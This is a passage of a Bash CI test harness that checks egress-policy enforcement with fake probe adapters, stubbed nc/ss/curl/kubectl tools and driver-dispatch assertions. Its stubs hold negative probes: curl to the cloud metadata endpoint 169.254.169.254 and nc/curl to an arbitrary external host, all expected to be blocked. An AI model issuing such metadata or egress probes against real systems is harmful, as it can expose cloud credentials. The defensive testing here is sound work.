    fail "$label adapter refusal emitted passing hostile-probe evidence"
}

prepare_run 7111
export FAKE_PROBE_FAIL_SCOPE=preexisting-open
expect_probe_refusal preexisting-open-nonzero
unset FAKE_PROBE_FAIL_SCOPE

prepare_run 7112
export FAKE_PROBE_MUTATE_SCOPE=preexisting-open FAKE_PROBE_DROP_ID=preexisting-flow-established
expect_probe_refusal preexisting-open-invalid
unset FAKE_PROBE_MUTATE_SCOPE FAKE_PROBE_DROP_ID

prepare_run 7113
export FAKE_PROBE_FAIL_SCOPE=preexisting-transition
expect_probe_refusal preexisting-transition-nonzero
unset FAKE_PROBE_FAIL_SCOPE

prepare_run 7114
export FAKE_PROBE_MUTATE_SCOPE=preexisting-transition \
  FAKE_PROBE_DROP_ID=preexisting-flow-transition-denial
expect_probe_refusal preexisting-transition-invalid
unset FAKE_PROBE_MUTATE_SCOPE FAKE_PROBE_DROP_ID

prepare_run 7115
export FAKE_PROBE_FAIL_SCOPE=host
expect_probe_refusal host-nonzero
unset FAKE_PROBE_FAIL_SCOPE

prepare_run 7116
export FAKE_PROBE_MUTATE_SCOPE=host FAKE_PROBE_OUTCOME=Fail
expect_probe_refusal host-invalid
unset FAKE_PROBE_MUTATE_SCOPE FAKE_PROBE_OUTCOME

prepare_run 7117
export FAKE_PROBE_FAIL_SCOPE=pod
expect_probe_refusal pod-nonzero
grep -Fq -- '--scope host' "$scratch/probe-pod-nonzero.log" ||
  fail 'host negative probe was skipped before pod failure'
grep -Fq -- '--scope pod' "$scratch/probe-pod-nonzero.log" ||
  fail 'actual-pod failure injection was not exercised'
unset FAKE_PROBE_FAIL_SCOPE

prepare_run 7118
export FAKE_PROBE_MUTATE_SCOPE=pod FAKE_PROBE_DROP_ID=pod-dns-denial
expect_probe_refusal pod-invalid
unset FAKE_PROBE_MUTATE_SCOPE FAKE_PROBE_DROP_ID

prepare_run 7119
export FAKE_PROBE_NO_TRANSCRIPT=host
expect_probe_refusal noop-exit-zero
unset FAKE_PROBE_NO_TRANSCRIPT

prepare_run 7120
export FAKE_PROBE_MUTATE_SCOPE=host FAKE_PROBE_CLUSTER=cluster-foreign
expect_probe_refusal foreign-cluster
unset FAKE_PROBE_MUTATE_SCOPE FAKE_PROBE_CLUSTER

prepare_run 7121
export FAKE_PROBE_MUTATE_SCOPE=pod FAKE_PROBE_REQUIRED=false
expect_probe_refusal optional-observation
unset FAKE_PROBE_MUTATE_SCOPE FAKE_PROBE_REQUIRED

prepare_run 7124
export FAKE_PROBE_MUTATE_SCOPE=preexisting-open FAKE_PROBE_REASON=AdapterObservedDenial
expect_probe_refusal preexisting-open-reason-swap
unset FAKE_PROBE_MUTATE_SCOPE FAKE_PROBE_REASON

prepare_run 7125
export FAKE_PROBE_MUTATE_SCOPE=preexisting-transition \
  FAKE_PROBE_REASON=AdapterObservedFlowEstablished
expect_probe_refusal preexisting-transition-reason-swap
unset FAKE_PROBE_MUTATE_SCOPE FAKE_PROBE_REASON

prepare_run 7126
export FAKE_PROBE_MUTATE_SCOPE=host FAKE_PROBE_REASON=AdapterObservedFlowEstablished
expect_probe_refusal host-reason-swap
unset FAKE_PROBE_MUTATE_SCOPE FAKE_PROBE_REASON

prepare_run 7127
export FAKE_PROBE_MUTATE_SCOPE=pod FAKE_PROBE_REASON=AdapterObservedFlowEstablished
expect_probe_refusal pod-reason-swap
unset FAKE_PROBE_MUTATE_SCOPE FAKE_PROBE_REASON
ok 'nonzero, malformed, reason-swapped, exit-zero no-op, foreign, and optional adapters all refuse'

fallback_tools=$scratch/fallback-tools
fallback_log=$scratch/fallback-tools.log
install -d -m 0700 "$fallback_tools"
: >"$fallback_log"
cat >"$fallback_tools/nc" <<'NC'
#!/usr/bin/env bash
set -euo pipefail
printf 'nc' >>"${FAKE_FALLBACK_LOG:?}"
printf ' %q' "$@" >>"$FAKE_FALLBACK_LOG"
printf '\n' >>"$FAKE_FALLBACK_LOG"
[[ $* == '-w 8 1.1.1.1 80' ]] || exit 127
IFS= read -r _ || true
NC
cat >"$fallback_tools/ss" <<'SS'
#!/usr/bin/env bash
set -euo pipefail
printf 'ss' >>"${FAKE_FALLBACK_LOG:?}"
printf ' %q' "$@" >>"$FAKE_FALLBACK_LOG"
printf '\n' >>"$FAKE_FALLBACK_LOG"
[[ $* == '-Htn state established dst 1.1.1.1:80' ]] || exit 127
printf '%s\n' 'ESTAB 0 0 10.0.0.2:4242 1.1.1.1:80'
SS
cat >"$fallback_tools/curl" <<'CURL'
#!/usr/bin/env bash
set -euo pipefail
printf 'curl' >>"${FAKE_FALLBACK_LOG:?}"
printf ' %q' "$@" >>"$FAKE_FALLBACK_LOG"
printf '\n' >>"$FAKE_FALLBACK_LOG"
case "$*" in
  '-fsS --connect-timeout 1 --max-time 2 http://169.254.169.254/' |
  '-kfsS --connect-timeout 1 --max-time 2 https://1.1.1.1/') exit 22 ;;
  *) exit 127 ;;
esac
CURL
cat >"$fallback_tools/kubectl" <<'KUBECTL_FALLBACK'
#!/usr/bin/env bash
set -euo pipefail
printf 'kubectl' >>"${FAKE_FALLBACK_LOG:?}"
printf ' %q' "$@" >>"$FAKE_FALLBACK_LOG"
printf '\n' >>"$FAKE_FALLBACK_LOG"
case ${1:-} in
  run)
    [[ $# -eq 10 && ${2:-} == diene-egress-* && ${3:-} == --restart=Never &&
      ${4:-} == "--image=${DIENE_EGRESS_CANARY_IMAGE:?}" &&
      ${5:-} == --image-pull-policy=Never && ${6:-} == --command && ${7:-} == -- &&
      ${8:-} == sh && ${9:-} == -ceu ]] || exit 127
    ;;
  wait)
    [[ $# -eq 4 && ${2:-} == "--for=jsonpath={.status.phase}=Succeeded" &&
      ${3:-} == pod/diene-egress-* && ${4:-} == --timeout=30s ]] || exit 127
    ;;
  delete)
    [[ $# -eq 5 && ${2:-} == pod && ${3:-} == diene-egress-* &&
      ${4:-} == --wait=true && ${5:-} == --timeout=30s ]] || exit 127
    ;;
  *) exit 127 ;;
esac
KUBECTL_FALLBACK
chmod 0755 "$fallback_tools/nc" "$fallback_tools/ss" "$fallback_tools/curl" \
  "$fallback_tools/kubectl"

prepare_run 7122
fallback_probes=$scratch/fallback-hostile-probes.json
(
  cd -- "$work"
  # shellcheck source=/dev/null
  source ./scripts/ci/environment-lib.sh
  unset DIENE_EGRESS_PROBE_BIN
  diene_validate_inputs
  export DIENE_NSC_CLUSTER_ID=cluster-fallback-7122
  export DIENE_KUBECTL_BIN="$fallback_tools/kubectl"
  export FAKE_FALLBACK_LOG="$fallback_log"
  export PATH="$fallback_tools:$PATH"
  diene_preflow_start
  diene_verify_hostile_egress "$fallback_probes"
) >"$scratch/fallback-probe.out" 2>"$scratch/fallback-probe.err" || {
  sed -n '1,200p' "$scratch/fallback-probe.err" >&2
  fail 'the built-in hostile egress fallback path failed under controlled seams'
}
jq -e '
  length == 6 and
  ([.[].id] | sort) == ["host-arbitrary-https-denial","host-metadata-denial",
    "pod-arbitrary-https-denial","pod-dns-denial","pod-metadata-denial",
    "preexisting-flow-transition-denial"] and
  all(.[]; .outcome == "Pass" and .required == true) and
  ([.[] | select(.id == "host-metadata-denial" or .id == "host-arbitrary-https-denial")] |
    length == 2 and all(.reasonCode == "ConnectionRefused"))
' "$fallback_probes" >/dev/null ||
  fail 'the built-in fallback did not retain the exact six required Pass observations'
[[ $(grep -c '^curl ' "$fallback_log") == 2 && $(grep -c '^kubectl run ' "$fallback_log") == 1 &&
  $(grep -c '^kubectl wait ' "$fallback_log") == 1 &&
  $(grep -c '^kubectl delete ' "$fallback_log") == 1 ]] ||
  fail 'the built-in fallback did not execute both host and the exact actual-pod negative probes'
ok 'the no-adapter fallback preserves both host observations and all six exact Pass IDs'

prepare_run 7123 ditto-vendor
vendor_contract=$scratch/vendor-contract.json
(
  cd -- "$work"
  # shellcheck source=/dev/null
  source ./scripts/ci/environment-lib.sh
  diene_validate_inputs
  diene_prepare_egress_contract "$vendor_contract"
) >"$scratch/vendor-contract.out" 2>"$scratch/vendor-contract.err" || {
  sed -n '1,120p' "$scratch/vendor-contract.err" >&2
  fail 'declared vendor broker/egress contract failed'
}
jq -e '.profileId == "ditto-vendor-v1" and .mode == "allowlist" and
  .platformStatus == "platform per-instance policy pending (support ask #4)" and
  .entries == [{dns:"vendor.example.test",sni:"vendor.example.test",port:443,
    methods:["GET","POST","DELETE"]}]' "$vendor_contract" >/dev/null ||
  fail 'vendor contract widened or changed its declared egress boundary'

broker_log=$scratch/broker-failure.log
: >"$broker_log"
if (cd -- "$work" && FAKE_BROKER_LOG="$broker_log" FAKE_BROKER_FAIL_COMMAND=issue \
  ./.diene/ci/vendor-broker issue --action demo-vendor --output "$scratch/vendor-secret" \
    --evidence "$scratch/vendor-broker-evidence.json"); then
  fail 'the fake broker failure injection unexpectedly issued a credential'
fi
[[ ! -e $scratch/vendor-secret ]] || fail 'failed broker issue left credential bytes'
grep -Fq 'diene_die VendorBrokerInterfaceUnavailable' "$script_dir/environment-vendor-run.sh" ||
  fail 'the vendor driver does not fail closed on broker issue'
# The quoted shell expression is intentionally matched literally.
# shellcheck disable=SC2016
grep -Fq 'if ! "$broker" revoke' "$script_dir/environment-vendor-run.sh" ||
  fail 'the vendor driver does not make broker revocation cleanup-blocking'
ok 'vendor broker issue/revoke and exact vendor allowlist remain fail closed'

printf '== hermetic direct core/vendor driver dispatch ==\n'

direct_source=$scratch/direct-source
install -d -m 0700 "$direct_source"
cp -R "$work/." "$direct_source/"

cat >"$direct_source/.diene/ci/fake-pls-direct" <<'PLS_DIRECT'
#!/usr/bin/env bash
set -euo pipefail
source_root=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/../.." && pwd)
# shellcheck source=/dev/null
source "$source_root/scripts/ci/environment-lib.sh"
printf 'pls %s\n' "$*" >>"${FAKE_DRIVER_EVENT_LOG:?}"
case "${1:-}:${2:-}" in
  closure:import)
    [[ $# -eq 3 && ${3:-} == "${DIENE_CLOSURE_BUNDLE_REF:?}" ]] || exit 127
    ;;
  closure:preflight)
    [[ $# -eq 3 && ${3:-} == --denied-network ]] || exit 127
    ;;
  env:up)
    [[ $# -eq 8 && ${3:-} == --profile && ${5:-} == --build-mode &&
      ${7:-} == --artifact && ${8:-} == "${DIENE_ARTIFACT_DIGEST:?}" ]] || exit 127
    profile=${4:?}
    build_mode=${6:?}
    install -d -m 0700 "${DIENE_RUNTIME_SEARCH_ROOT:?}"
    jq -n --arg profile "$profile" --arg mode "$build_mode" \
      --arg repositoryId "$GITHUB_REPOSITORY_ID" --arg repositoryKey "$GITHUB_REPOSITORY" \
      --arg allocation "$(diene_allocation_key)" --arg generation "$(diene_generation_key)" \
      --arg substrate "direct-${DIENE_LANE}" --arg receipt "$(diene_receipt_id)" \
      --arg artifact "$DIENE_ARTIFACT_DIGEST" '
      {apiVersion:"diene-runtime/v1",profile:$profile,buildMode:$mode,
       owner:{repositoryId:$repositoryId,repositoryKey:$repositoryKey,
         allocationKey:$allocation,generationKey:$generation},
       substrate:{kind:"k3d",name:$substrate,receipt:$receipt},artifact:{digest:$artifact}}
    ' >"$DIENE_RUNTIME_SEARCH_ROOT/runtime.json"
    chmod 0600 "$DIENE_RUNTIME_SEARCH_ROOT/runtime.json"
    ;;
  env:doctor)
    [[ $# -eq 5 && ${3:-} == --profile && ${5:-} == --json ]] || exit 127
    profile=${4:?}
    jq -n --arg profile "$profile" --arg allocation "$(diene_allocation_key)" '
      def leaf($id;$required):
        if $required then {id:$id,outcome:"Pass",required:true,reasonCode:"ControlledUnitInput",
          sourceUid:("unit-"+$id),observedGeneration:1,allocationKey:$allocation,
          transitionTime:"2026-08-01T00:00:00Z"}
        else {id:$id,outcome:"NotRequired",required:false,reasonCode:"NotApplicableToLane"} end;
      {apiVersion:"diene-readiness/v1",profile:$profile,aggregate:"EnvironmentReady",outcome:"Pass",
       readiness:[leaf("SubstrateReady";true),leaf("SeedReady";true),leaf("StoreReady";true),
        leaf("ExternalSecretsReady";true),leaf("DependenciesReady";true),leaf("PVCsReady";true),
        leaf("MigrationsReady";true),leaf("FixturesReady";true),leaf("LogtoReady";true),
        leaf("ArtifactPullReady";true),leaf("ApplicationWorkloadsReady";true),
        leaf("ExposurePrerequisitesReady";true),leaf("ExposureReady";true),
        leaf("EnvironmentReady";true),leaf("AllocationReady";false),
        leaf("CastformProdSafetyReady";false),leaf("CallbackReady";false)]}
    '
    ;;
  env:down)
    [[ $# -eq 4 && ${3:-} == --profile && -f ${DIENE_GARDEN_RUNTIME_FILE:-} ]] || exit 127
    ;;
  *) exit 127 ;;
esac
PLS_DIRECT

cat >"$direct_source/.diene/ci/fake-pull-proof" <<'PULL_DIRECT'
#!/usr/bin/env bash
set -euo pipefail
proof=${1:-}
[[ $# -eq 5 && ${2:-} == --digest && ${3:-} == "${DIENE_ARTIFACT_DIGEST:?}" &&
  ${4:-} == --receipt && ${5:-} == "${DIRECT_RECEIPT_ID:?}" ]] || exit 127
case $proof in
  real-pull | evict-repull | sibling-denial | pull-secret-ownership | credential-removal) ;;
  *) exit 127 ;;
esac
printf 'pull %s\n' "$proof" >>"${FAKE_DRIVER_EVENT_LOG:?}"
PULL_DIRECT

cat >"$direct_source/.diene/ci/fake-closure-verify" <<'CLOSURE_DIRECT'
#!/usr/bin/env bash
set -euo pipefail
case ${1:-} in
  verify)
    [[ $# -eq 9 && ${2:-} == --digest && ${3:-} == "${DIENE_CLOSURE_DIGEST:?}" &&
      ${4:-} == --bundle && ${5:-} == "${DIENE_CLOSURE_BUNDLE_REF:?}" &&
      ${6:-} == --signature-digest && ${7:-} == "${DIENE_CLOSURE_SIGNATURE_BUNDLE_DIGEST:?}" &&
      ${8:-} == --trust-root-digest && ${9:-} == "${DIENE_CLOSURE_TRUST_ROOT_DIGEST:?}" ]] || exit 127
    printf 'closure verify\n' >>"${FAKE_DRIVER_EVENT_LOG:?}"
    ;;
  exact-set)
    [[ $# -eq 4 && ${2:-} == --digest && ${3:-} == "${DIENE_CLOSURE_DIGEST:?}" &&
      ${4:-} == --network-denied ]] || exit 127
    printf 'closure exact-set\n' >>"${FAKE_DRIVER_EVENT_LOG:?}"
    ;;
  *) exit 127 ;;
esac
CLOSURE_DIRECT

cat >"$direct_source/.diene/ci/fake-fleet-negative-observer" <<'FLEET_DIRECT'
#!/usr/bin/env bash
set -euo pipefail
[[ $* == '--fixture bootstrap-fleet-independence-v1 --forbidden diene-fleet-controller --forbidden diene-fleet-agent' ]] ||
  exit 127
printf 'fleet-negative-observed bootstrap-fleet-independence-v1 diene-fleet-controller diene-fleet-agent\n' \
  >>"${FAKE_DRIVER_EVENT_LOG:?}"
FLEET_DIRECT

cat >"$direct_source/.diene/ci/direct-driver-action" <<'ACTION_DIRECT'
#!/usr/bin/env bash
set -euo pipefail
phase=${1:-}
[[ $# -eq 1 ]] || exit 127
case "${DIENE_LANE:?}:$phase" in
  ditto-build-local:setup | ditto-build-local:probe | ditto-build-local:cleanup | \
  ditto-target-pull:setup | ditto-target-pull:probe | ditto-target-pull:cleanup | \
  absol:setup | absol:probe | absol:cleanup | \
  fleet-independence:setup | fleet-independence:probe | fleet-independence:cleanup | \
  ditto-vendor:setup | ditto-vendor:probe | ditto-vendor:cleanup | ditto-vendor:absence) ;;
  *) exit 127 ;;
esac
printf 'journey %s %s\n' "$DIENE_LANE" "$phase" >>"${FAKE_DRIVER_EVENT_LOG:?}"
if [[ $DIENE_LANE == ditto-vendor ]]; then
  [[ -n ${DIENE_VENDOR_CREDENTIAL:-} ]] || exit 65
fi
if [[ $DIENE_LANE == fleet-independence && $phase == probe ]]; then
  fixture=.diene/ci/fixtures/bootstrap-fleet-independence-v1/manifest.yaml
  jq -e '
    .id == "bootstrap-fleet-independence-v1" and
    .forbiddenResources == ["diene-fleet-controller","diene-fleet-agent"]
  ' "$fixture" >/dev/null || exit 66
  .diene/ci/fake-fleet-negative-observer --fixture bootstrap-fleet-independence-v1 \
    --forbidden diene-fleet-controller --forbidden diene-fleet-agent
fi
ACTION_DIRECT

cat >"$direct_source/.diene/ci/direct-broker" <<'BROKER_DIRECT'
#!/usr/bin/env bash
set -euo pipefail
case ${1:-} in
  issue)
    [[ $# -eq 7 && ${2:-} == --action && ${3:-} == demo-vendor &&
      ${4:-} == --output && ${6:-} == --evidence ]] || exit 127
    printf 'broker issue\n' >>"${FAKE_DRIVER_EVENT_LOG:?}"
    printf '%s\n' controlled-unit-credential >"${5:?}"
    chmod 0600 "${5:?}"
    jq -n '{outcome:"Pass",masked:true,issuedAfterReadiness:true}' >"${7:?}"
    ;;
  revoke)
    [[ $# -eq 7 && ${2:-} == --action && ${3:-} == demo-vendor &&
      ${4:-} == --credential-file && ${6:-} == --absence-proven && ${7:-} == true ]] || exit 127
    printf 'broker revoke true\n' >>"${FAKE_DRIVER_EVENT_LOG:?}"
    ;;
  *) exit 127 ;;
esac
BROKER_DIRECT
chmod 0755 "$direct_source/.diene/ci/fake-pls-direct" \
  "$direct_source/.diene/ci/fake-pull-proof" \
  "$direct_source/.diene/ci/fake-closure-verify" \
  "$direct_source/.diene/ci/fake-fleet-negative-observer" \
  "$direct_source/.diene/ci/direct-driver-action" "$direct_source/.diene/ci/direct-broker"
for direct_executable in \
  "$direct_source/.diene/ci/fake-pls-direct" \
  "$direct_source/.diene/ci/fake-pull-proof" \
  "$direct_source/.diene/ci/fake-closure-verify" \
  "$direct_source/.diene/ci/fake-fleet-negative-observer" \
  "$direct_source/.diene/ci/direct-driver-action" \
  "$direct_source/.diene/ci/direct-broker"; do
  bash -n "$direct_executable" || fail "generated direct executable is not valid Bash: $direct_executable"
done
ok 'every generated direct-driver executable is Bash syntax-valid'

direct_fleet_fixture=$direct_source/.diene/ci/fixtures/bootstrap-fleet-independence-v1/manifest.yaml
jq '.forbiddenResources = ["diene-fleet-controller","diene-fleet-agent"]' \
  "$direct_fleet_fixture" >"$direct_fleet_fixture.tmp"
mv "$direct_fleet_fixture.tmp" "$direct_fleet_fixture"
direct_demo_digest="sha256:$(sha256sum "$direct_source/.diene/ci/fixtures/demo/manifest.yaml" | awk '{print $1}')"
direct_fleet_digest="sha256:$(sha256sum "$direct_fleet_fixture" | awk '{print $1}')"
direct_journeys=$direct_source/.diene/ci/journeys.v1.yaml
jq --arg demo "$direct_demo_digest" --arg fleet "$direct_fleet_digest" '
  .journeys |= map(
    .fixturePack.digest = (if .fixturePack.id == "demo" then $demo else $fleet end) |
    .setup = [".diene/ci/direct-driver-action","setup"] |
    .probe = [".diene/ci/direct-driver-action","probe"] |
    .cleanup = [".diene/ci/direct-driver-action","cleanup"])
' "$direct_journeys" >"$direct_journeys.tmp"
mv "$direct_journeys.tmp" "$direct_journeys"
direct_vendors=$direct_source/.diene/ci/vendors.v1.yaml
jq '
  .actions |= map(
    .setup = [".diene/ci/direct-driver-action","setup"] |
    .probe = [".diene/ci/direct-driver-action","probe"] |
    .cleanup = [".diene/ci/direct-driver-action","cleanup"] |
    .absence = [".diene/ci/direct-driver-action","absence"])
' "$direct_vendors" >"$direct_vendors.tmp"
mv "$direct_vendors.tmp" "$direct_vendors"
if rg -n '/bin/true' "$direct_journeys" "$direct_vendors" >"$scratch/direct-noop-actions"; then
  sed -n '1,120p' "$scratch/direct-noop-actions" >&2
  fail 'a direct-driver journey or vendor action still uses /bin/true'
fi

direct_fake_preflight() {
  local output=
  while (($#)); do
    case $1 in
      --output) output=${2:-}; shift 2 ;;
      *) return 127 ;;
    esac
  done
  [[ -n $output ]] || return 127
  printf 'preflight %s\n' "$DIENE_LANE" >>"${FAKE_DRIVER_EVENT_LOG:?}"
  # Even this controlled unit stub may not invent a runtime version or service
  # range; both come from the admitted inputs under test.
  jq -n --arg cluster "$DIENE_NSC_CLUSTER_ID" --arg k3s "${DIENE_ADMITTED_K3S_VERSION:?}" \
    --arg serviceCidr "${DIENE_K3S_SERVICE_CIDR:?}" '
    {outcome:"Pass",reasonCode:"NamespaceWolfiBuiltInK3sReady",clusterId:$cluster,
     identitySource:"controlled-direct-driver-unit-input",os:{id:"wolfi",version:"rolling",uid:0},
     k3s:{version:$k3s,kubernetesVersion:$k3s,nodeCount:1,
       capacity:{cpu:"16",memory:"32Gi"}},
     network:{podCidrs:["10.142.0.0/16","fd00:142::/64"],serviceCidrs:[$serviceCidr],
       ipv6Disabled:false,namespaceIngress:false,publicBinding:false},
     storage:{defaultClass:"local-path"},
     policyBackend:{mechanism:"iptables",backend:"nf_tables",version:"iptables v1.8.13 (nf_tables)"},
     cacheAttached:false,platformStatus:"platform per-instance policy pending (support ask #4)"}
  ' >"$output"
}

prepare_direct_driver_case() {
  local run_id=${1:?run id required} lane=${2:?lane required}
  local direct_runner=$scratch/direct-runner-$run_id
  prepare_run "$run_id" "$lane" "$direct_runner" "$scratch/direct-unused-nsc-$run_id"
  DIRECT_STATE=$scratch/direct-state-$run_id
  DIRECT_EVENT_LOG=$DIRECT_STATE/events.log
  DIRECT_TABLE_STATE=$DIRECT_STATE/policy-state
  install -d -m 0700 "$DIRECT_STATE/receipts" "$DIRECT_STATE/runtime-search" \
    "$DIRECT_STATE/tmp" "$DIRECT_TABLE_STATE"
  cp "$DIENE_ARTIFACT_SUBJECT" "$DIRECT_STATE/artifact-subject.json"
  chmod 0600 "$DIRECT_STATE/artifact-subject.json"
  export DIENE_ARTIFACT_SUBJECT="$DIRECT_STATE/artifact-subject.json"
  export RUNNER_TEMP="$DIRECT_STATE/tmp" DIENE_SCHEMA_DIR="$direct_source/schemas/ci"
  export DIENE_NSC_CLUSTER_ID="direct-$lane-$run_id" DIENE_NSC_VERSION=v0.0.532
  export DIENE_NSC_ARTIFACT_DIGEST=sha256:6666666666666666666666666666666666666666666666666666666666666666
  export DIENE_NSC_BINARY_DIGEST="$fake_nsc_binary_digest"
  DIENE_SOURCE_ARCHIVE_DIGEST="sha256:$(sha256sum "$source_archive" | awk '{print $1}')"
  export DIENE_SOURCE_ARCHIVE_DIGEST
  export DIENE_CACHE_ATTACHED=false DIENE_ORCHESTRATOR_VENUE=local
  export DIENE_ORCHESTRATOR_LABEL=local-contract-test
  export DIENE_ORCHESTRATOR_FALLBACK_REASON=''
  export DIENE_EGRESS_CONTRACT="$DIRECT_STATE/egress-contract.json"
  export DIENE_PLS_BIN=.diene/ci/fake-pls-direct
  export DIENE_PULL_PROOF_BIN=.diene/ci/fake-pull-proof
  export DIENE_CLOSURE_VERIFY_BIN=.diene/ci/fake-closure-verify
  export DIENE_RUNTIME_SEARCH_ROOT="$DIRECT_STATE/runtime-search"
  export DIENE_RECEIPT_DIR="$DIRECT_STATE/receipts"
  export DIENE_KUBECTL_BIN="$policy_tools/kubectl"
  export DIENE_IPTABLES_BIN="$policy_tools/iptables4"
  export DIENE_IP6TABLES_BIN="$policy_tools/iptables6"
  export DIENE_EGRESS_RESOLVER_BIN="$policy_tools/resolver"
  export DIENE_IPV6_DISABLE_PATH="$ipv6_enabled_path"
  export FAKE_DRIVER_EVENT_LOG="$DIRECT_EVENT_LOG"
  export FAKE_TABLE_STATE="$DIRECT_TABLE_STATE" FAKE_TABLE_LOG="$DIRECT_STATE/tables.log"
  export FAKE_KUBECTL_LOG="$DIRECT_STATE/kubectl.log"
  export FAKE_L7_LOG="$DIRECT_STATE/l7.log" FAKE_PROBE_LOG="$DIRECT_STATE/probe.log"
  export SSH_CONNECTION='192.0.2.10 4242 10.0.0.2 22'
  : >"$DIRECT_EVENT_LOG"
  : >"$FAKE_TABLE_LOG"
  : >"$FAKE_KUBECTL_LOG"
  : >"$FAKE_L7_LOG"
  : >"$FAKE_PROBE_LOG"
  if [[ $lane == ditto-vendor ]]; then
    export DIENE_VENDOR_CREDENTIAL_BROKER_BIN=.diene/ci/direct-broker
  fi
  (
    cd -- "$direct_source"
    # shellcheck source=/dev/null
    source ./scripts/ci/environment-lib.sh
    diene_prepare_egress_contract "$DIENE_EGRESS_CONTRACT"
  )
  DIRECT_RECEIPT_ID=$(
    cd -- "$direct_source"
    # shellcheck source=/dev/null
    source ./scripts/ci/environment-lib.sh
    diene_receipt_id
  )
  export DIRECT_RECEIPT_ID
  local create_digest armed_receipt
  create_digest="sha256:$(printf '%s' "$DIENE_NSC_CLUSTER_ID|controlled-create" | sha256sum | awk '{print $1}')"
  armed_receipt=$(
    cd -- "$direct_source"
    # shellcheck source=/dev/null
    source ./scripts/ci/environment-lib.sh
    diene_arm_receipt "$DIRECT_RECEIPT_ID" "$DIENE_NSC_CLUSTER_ID" "$create_digest" 0 false \
      "$DIENE_NSC_VERSION" "$DIENE_NSC_ARTIFACT_DIGEST" "$DIENE_NSC_BINARY_DIGEST"
  )
  mv "$armed_receipt" "$DIRECT_STATE/receipts/exact.json"
  export DIRECT_STATE DIRECT_EVENT_LOG DIRECT_TABLE_STATE
}

run_direct_core_case() (
  cd -- "$direct_source"
  # shellcheck source=/dev/null
  source ./scripts/ci/environment-k3d-run.sh
  # The sourced driver calls both overrides indirectly.
  # shellcheck disable=SC2329
  diene_load_remote_inputs() {
    [[ ${1:-} == "$DIRECT_STATE" ]] || diene_die InputContractInvalid 'unit state mismatch'
  }
  # shellcheck disable=SC2329
  diene_core_driver_preflight() {
    direct_fake_preflight "$@"
  }
  driver_core "$DIRECT_STATE"
)

run_direct_vendor_case() (
  cd -- "$direct_source"
  # shellcheck source=/dev/null
  source ./scripts/ci/environment-vendor-run.sh
  # The sourced driver calls both overrides indirectly.
  # shellcheck disable=SC2329
  diene_load_remote_inputs() {
    [[ ${1:-} == "$DIRECT_STATE" ]] || diene_die InputContractInvalid 'unit state mismatch'
  }
  # shellcheck disable=SC2329
  diene_vendor_driver_preflight() {
    direct_fake_preflight "$@"
  }
  vendor_driver_core "$DIRECT_STATE"
)

assert_direct_vendor_main_no_return_trap() (
  cd -- "$direct_source"
  # shellcheck source=/dev/null
  source ./scripts/ci/environment-vendor-run.sh
  environment_vendor_main --validate-inputs
  [[ -z $(trap -p RETURN) ]]
)

assert_direct_success() {
  local lane=${1:?lane required} kind=${2:-core}
  local report=$DIRECT_STATE/evidence/core-report.driver.json
  local schema=diene-environment-report-v1.schema.json
  local completed_reason=DriverCompleted
  [[ $kind != vendor ]] || {
    report=$DIRECT_STATE/evidence/vendor-report.driver.json
    schema=diene-vendor-report-v1.schema.json
    completed_reason=VendorCompleted
  }
  jq -e --arg reason "$completed_reason" \
    '.outcome == "Pass" and .reasonCode == $reason and .exitCode == 0' \
    "$DIRECT_STATE/evidence/driver-status.json" >/dev/null ||
    fail "$lane direct driver did not package a green status"
  local finalized_report=$DIRECT_STATE/final-$kind-report.json
  (
    cd -- "$direct_source"
    DIENE_EVIDENCE_STAGING="$DIRECT_STATE/evidence/staging" \
      DIENE_PROOF_BUNDLE_DIR="$DIRECT_STATE/evidence" \
      ./scripts/ci/environment-report.sh --kind "$kind" --input "$report" \
      --output "$finalized_report"
  ) || fail "$lane direct driver report did not pass real leakage finalisation"
  report=$finalized_report
  local schema_log=$DIRECT_STATE/report-schema-validation.log
  if ! "${DIENE_SCHEMA_VALIDATOR_BIN:-check-jsonschema}" \
    --base-uri "file://$direct_source/schemas/ci/" \
    --schemafile "$direct_source/schemas/ci/$schema" "$report" >"$schema_log" 2>&1; then
    sed -n '1,240p' "$report" >&2
    sed -n '1,240p' "$schema_log" >&2
    fail "$lane direct driver report is not schema-valid"
  fi
  jq -e '.namespace.policy.applied == true and .namespace.policy.hostileProbes == "Pass" and
    .cleanup == {outcome:"Pass",reasonCode:"ExactReceiptDestroyed",debt:[]}' \
    "$DIRECT_STATE/evidence/ci-receipt.json" >/dev/null ||
    fail "$lane direct driver did not bind policy and exact cleanup into its receipt"
  assert_policy_state_absent "$DIRECT_TABLE_STATE" "$lane-direct-driver"
}

assert_direct_events() {
  local lane=${1:?lane required} expected=${2:?expected events required}
  [[ $(<"$DIRECT_EVENT_LOG") == "$expected" ]] || {
    sed -n '1,200p' "$DIRECT_EVENT_LOG" >&2
    fail "$lane direct driver dispatch/order changed"
  }
}

# These are controlled unit inputs to the real driver consumers. They do not
# claim Garden product readiness or production endpoint/resource coverage.
prepare_direct_driver_case 7201 ditto-build-local
run_direct_core_case >"$scratch/direct-build-local.out" 2>"$scratch/direct-build-local.err" || {
  sed -n '1,240p' "$scratch/direct-build-local.err" >&2
  sed -n '1,240p' "$DIRECT_EVENT_LOG" >&2
  sed -n '1,240p' "$DIRECT_STATE/evidence/staging/stderr" >&2
  fail 'the real build-local driver_core unit dispatch failed'
}
assert_direct_success ditto-build-local
expected_direct_events=$'preflight ditto-build-local\n'
expected_direct_events+="pls env up --profile ditto --build-mode build-local --artifact $ARTIFACT_DIGEST"$'\n'
expected_direct_events+=$'pls env doctor --profile ditto --json\n'
expected_direct_events+=$'journey ditto-build-local setup\njourney ditto-build-local probe\njourney ditto-build-local cleanup\n'
expected_direct_events+='pls env down --profile ditto'
assert_direct_events ditto-build-local "$expected_direct_events"

prepare_direct_driver_case 7202 ditto-target-pull
run_direct_core_case >"$scratch/direct-target-pull.out" 2>"$scratch/direct-target-pull.err" || {
  sed -n '1,240p' "$scratch/direct-target-pull.err" >&2
  fail 'the real target-pull driver_core unit dispatch failed'
}
assert_direct_success ditto-target-pull
expected_direct_events=$'preflight ditto-target-pull\n'
expected_direct_events+="pls env up --profile ditto --build-mode target-pull --artifact $ARTIFACT_DIGEST"$'\n'
expected_direct_events+=$'pls env doctor --profile ditto --json\n'
expected_direct_events+=$'pull real-pull\npull evict-repull\npull sibling-denial\npull pull-secret-ownership\npull credential-removal\n'
expected_direct_events+=$'journey ditto-target-pull setup\njourney ditto-target-pull probe\njourney ditto-target-pull cleanup\n'
expected_direct_events+='pls env down --profile ditto'
assert_direct_events ditto-target-pull "$expected_direct_events"

prepare_direct_driver_case 7203 absol
